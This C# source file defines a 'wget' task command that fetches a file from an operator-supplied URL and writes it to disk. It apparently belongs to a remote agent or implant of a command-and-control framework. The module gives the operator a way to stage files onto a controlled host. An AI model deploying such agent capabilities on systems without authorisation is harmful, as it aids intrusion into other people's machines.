using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class WGetCommand : AgentCommand
    {
        public override string Name => "wget";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
            if (task.SplittedArgs.Count() <1)
            {
                result.Result = $"Usage : {this.Name} Url <fileName>";
                return;
            }

            
            var url = task.SplittedArgs[0];
            Uri uri = null;
            try
            {
                uri = new Uri(url);
            }
            catch
            {
                result.Result += "Url was not in correct format" + Environment.NewLine;
                throw;
            }


            string outFile;
            if (task.SplittedArgs.Length > 1)
                outFile = task.SplittedArgs[1];
            else
               outFile = Path.GetFileName(uri.AbsolutePath);
            if (string.IsNullOrEmpty(outFile))
                outFile = "tmp";

            var client = new System.Net.Http.HttpClient();
           var response =  client.GetAsync(uri).Result;
            if (!response.IsSuccessStatusCode)
            {
                result.Result += $"Error downloading {uri} : HTTP Code {response.StatusCode}" + Environment.NewLine;
                return;
            }

            byte[] content = response.Content.ReadAsByteArrayAsync().Result;

            File.WriteAllBytes(outFile, content);
            result.Result += $"{uri} Successfully dowloaded to {outFile}" + Environment.NewLine;


        }
    }
}
